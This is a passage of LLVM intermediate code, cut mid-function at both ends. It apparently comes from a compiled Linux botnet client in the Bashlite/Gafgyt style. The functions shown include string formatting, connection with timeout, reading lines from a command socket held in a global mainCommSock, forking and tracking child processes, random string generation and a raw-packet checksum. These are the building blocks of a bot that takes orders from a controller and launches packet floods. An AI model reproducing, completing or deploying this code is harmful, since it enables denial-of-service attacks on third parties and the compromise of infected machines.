  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  br label %146

; <label>:67:                                     ; preds = %.critedge
  %68 = load i32, i32* %8, align 8
  %69 = icmp ult i32 %68, 41
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %67
  %71 = load i8*, i8** %9, align 8
  %72 = sext i32 %68 to i64
  %73 = getelementptr i8, i8* %71, i64 %72
  %74 = add i32 %68, 8
  store i32 %74, i32* %8, align 8
  br label %78

; <label>:75:                                     ; preds = %67
  %76 = load i8*, i8** %10, align 8
  %77 = getelementptr i8, i8* %76, i64 8
  store i8* %77, i8** %10, align 8
  br label %78

; <label>:78:                                     ; preds = %75, %70
  %.in4 = phi i8* [ %73, %70 ], [ %76, %75 ]
  %79 = bitcast i8* %.in4 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = tail call fastcc i32 @printi(i8** %0, i32 %80, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  br label %146

; <label>:82:                                     ; preds = %.critedge
  %83 = load i32, i32* %11, align 8
  %84 = icmp ult i32 %83, 41
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %82
  %86 = load i8*, i8** %12, align 8
  %87 = sext i32 %83 to i64
  %88 = getelementptr i8, i8* %86, i64 %87
  %89 = add i32 %83, 8
  store i32 %89, i32* %11, align 8
  br label %93

; <label>:90:                                     ; preds = %82
  %91 = load i8*, i8** %13, align 8
  %92 = getelementptr i8, i8* %91, i64 8
  store i8* %92, i8** %13, align 8
  br label %93

; <label>:93:                                     ; preds = %90, %85
  %.in3 = phi i8* [ %88, %85 ], [ %91, %90 ]
  %94 = bitcast i8* %.in3 to i32*
  %95 = load i32, i32* %94, align 4
  %96 = tail call fastcc i32 @printi(i8** %0, i32 %95, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  br label %146

; <label>:97:                                     ; preds = %.critedge
  %98 = load i32, i32* %14, align 8
  %99 = icmp ult i32 %98, 41
  br i1 %99, label %100, label %105

; <label>:100:                                    ; preds = %97
  %101 = load i8*, i8** %15, align 8
  %102 = sext i32 %98 to i64
  %103 = getelementptr i8, i8* %101, i64 %102
  %104 = add i32 %98, 8
  store i32 %104, i32* %14, align 8
  br label %108

; <label>:105:                                    ; preds = %97
  %106 = load i8*, i8** %16, align 8
  %107 = getelementptr i8, i8* %106, i64 8
  store i8* %107, i8** %16, align 8
  br label %108

; <label>:108:                                    ; preds = %105, %100
  %.in2 = phi i8* [ %103, %100 ], [ %106, %105 ]
  %109 = bitcast i8* %.in2 to i32*
  %110 = load i32, i32* %109, align 4
  %111 = tail call fastcc i32 @printi(i8** %0, i32 %110, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  br label %146

; <label>:112:                                    ; preds = %.critedge
  %113 = load i32, i32* %17, align 8
  %114 = icmp ult i32 %113, 41
  br i1 %114, label %115, label %120

; <label>:115:                                    ; preds = %112
  %116 = load i8*, i8** %18, align 8
  %117 = sext i32 %113 to i64
  %118 = getelementptr i8, i8* %116, i64 %117
  %119 = add i32 %113, 8
  store i32 %119, i32* %17, align 8
  br label %123

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %19, align 8
  %122 = getelementptr i8, i8* %121, i64 8
  store i8* %122, i8** %19, align 8
  br label %123

; <label>:123:                                    ; preds = %120, %115
  %.in1 = phi i8* [ %118, %115 ], [ %121, %120 ]
  %124 = bitcast i8* %.in1 to i32*
  %125 = load i32, i32* %124, align 4
  %126 = tail call fastcc i32 @printi(i8** %0, i32 %125, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  br label %146

; <label>:127:                                    ; preds = %.critedge
  %128 = load i32, i32* %20, align 8
  %129 = icmp ult i32 %128, 41
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %21, align 8
  %132 = sext i32 %128 to i64
  %133 = getelementptr i8, i8* %131, i64 %132
  %134 = add i32 %128, 8
  store i32 %134, i32* %20, align 8
  br label %138

; <label>:135:                                    ; preds = %127
  %136 = load i8*, i8** %24, align 8
  %137 = getelementptr i8, i8* %136, i64 8
  store i8* %137, i8** %24, align 8
  br label %138

; <label>:138:                                    ; preds = %135, %130
  %.in = phi i8* [ %133, %130 ], [ %136, %135 ]
  %139 = bitcast i8* %.in to i32*
  %140 = load i32, i32* %139, align 4
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %142 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  br label %146

; <label>:143:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %144 = load i8, i8* %.3, align 1
  %145 = zext i8 %144 to i32
  tail call fastcc void @printchar(i8** %0, i32 %145)
  br label %146

; <label>:146:                                    ; preds = %.critedge, %143, %138, %123, %108, %93, %78, %59
  %.4 = phi i8* [ %.3, %143 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %78 ], [ %.2.lcssa, %93 ], [ %.2.lcssa, %108 ], [ %.2.lcssa, %123 ], [ %.2.lcssa, %138 ], [ %.2.lcssa, %.critedge ]
  %147 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:148:                                    ; preds = %27, %25
  %149 = icmp eq i8** %0, null
  br i1 %149, label %152, label %150

; <label>:150:                                    ; preds = %148
  %151 = load i8*, i8** %0, align 8
  store i8 0, i8* %151, align 1
  br label %152

; <label>:152:                                    ; preds = %148, %150
  %153 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %153)
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #7
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #7
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %5) #7
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #7
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #13
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #13
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #7, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #7
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #7
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #7
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #7
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #7
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #7
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #8 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !3

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
